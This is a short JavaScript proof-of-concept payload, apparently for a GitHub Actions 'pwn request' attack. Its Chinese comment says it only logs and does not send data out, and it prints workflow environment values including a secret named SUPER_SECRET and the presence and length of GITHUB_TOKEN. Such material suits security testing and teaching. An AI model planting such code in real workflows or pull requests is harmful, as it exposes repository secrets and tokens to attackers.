// === 攻击者 payload (只打印到日志,不外发) ===
console.log("### PWN-REQUEST PAYLOAD EXECUTED ###");
console.log("event_name   =", process.env.GITHUB_EVENT_NAME);
console.log("actor        =", process.env.GITHUB_ACTOR);
console.log("repository   =", process.env.GITHUB_REPOSITORY);
console.log("SUPER_SECRET =", process.env.SUPER_SECRET || "(empty)");
console.log("GITHUB_TOKEN =", process.env.GITHUB_TOKEN ? "[present len="+process.env.GITHUB_TOKEN.length+"]" : "(empty)");
console.log("### END ###");
